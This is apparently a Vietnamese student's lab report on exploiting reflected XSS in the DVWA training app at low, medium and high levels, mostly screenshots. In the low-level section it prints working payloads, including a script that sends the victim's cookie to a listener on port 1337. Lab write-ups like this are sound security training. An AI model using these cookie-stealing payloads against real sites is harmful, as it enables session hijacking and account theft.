# BÁO CÁO QUÁ TRÌNH KHAI THÁC XSS REFLECTED (LOW, MEDIUM, HIGH)

---

## 1. XSS REFLECTED (LOW)

Đầu tiên, giao diện xuất hiện một *text field* cho phép người dùng nhập tên và gửi:

<img width="1439" height="621" alt="image" src="https://github.com/user-attachments/assets/8b414797-a981-4648-a0ed-f54914d5df40" />

Sau khi nhập tên và submit, dữ liệu tên đã nhập trước đó sẽ được hiển thị lại (reflect) ngay trên giao diện là: Hello + <dữ liệu nhập> → chứa lỗ hổng XSS Reflected.

Kiểm tra source PHP ta thấy không hề xử lý (sanitize/encode) dữ liệu đầu vào trước khi xuất ra trang HTML:

<img width="1442" height="653" alt="image" src="https://github.com/user-attachments/assets/cd3344a1-9951-4793-8275-2989f174c6e5" />

Nhập dữ liệu đoạn mã JavaScript lấy cookie hiện tại như bên dưới, sau đó nhấn submit:

```bash
<script>alert(document.cookie)</script>
```

<img width="1444" height="611" alt="image" src="https://github.com/user-attachments/assets/e08e13e1-f82f-4d5a-87f9-6af6cf519048" />

<img width="1438" height="603" alt="image" src="https://github.com/user-attachments/assets/44137da0-2a67-4885-ac20-7cc6c9f590a2" />

Ta có thể thấy đoạn mã JS đã được chèn vào trong cấu trúc:

<img width="1440" height="607" alt="image" src="https://github.com/user-attachments/assets/1b151a82-75a0-4e0d-bd9b-81f235a179af" />

Nhập mã Javascript sử dụng *window.location* để gửi cookie hiện tại về cho máy chủ HTTP local trên port 1337:

```bash
<script>window.location=’http://127.0.0.1:1337/?cookie=’ + document.cookie</script>
```

<img width="1443" height="600" alt="image" src="https://github.com/user-attachments/assets/d60e9a42-cc36-40d5-895f-a8a6b190e03f" />

---

## 2. XSS REFLECTED  (MEDIUM)

Thực hiện nhập dữ liệu đầu vào là đoạn mã JS: 

```bash
<script>alert(document.cookie)</script
```

<img width="1442" height="636" alt="image" src="https://github.com/user-attachments/assets/f775d184-56cf-455b-90f5-a069ac82ecf0" />

&rarr; Nhận thấy thẻ <script> đã bị xóa trước khi reflect lại cho giao diện → dữ liệu đầu vào có thể đã thực hiện loại bỏ đi thẻ <script>.

Nhập payload sử dụng các thẻ khác như: img, svg, body, a, …

<img width="1439" height="629" alt="image" src="https://github.com/user-attachments/assets/b046bc93-a2a7-4b3e-b93f-2c1f4fc21237" />

<img width="1437" height="633" alt="image" src="https://github.com/user-attachments/assets/51e350bb-ddff-4dbe-96d7-b006c6f0d8cc" />

<img width="1442" height="607" alt="image" src="https://github.com/user-attachments/assets/77016df9-ee9c-42f2-92af-eabbae4060da" />

<img width="1440" height="603" alt="image" src="https://github.com/user-attachments/assets/e9611f44-4658-4d96-bf4b-1beca7d83806" />

Nhập payload là các biến thể khác của thẻ <script>:

<img width="1446" height="627" alt="image" src="https://github.com/user-attachments/assets/41bc6cf0-2f10-4a45-aa1d-9567b85bd3dd" />

---

## 3. XSS REFLECTED (HIGH)

Sử dụng các thẻ khác thẻ <script> tương tự như trong báo XSS stored.

---

## ✅ Kết luận:

Thành công khai thác lỗ hổng XSS Reflected trên lab DVWA.

---

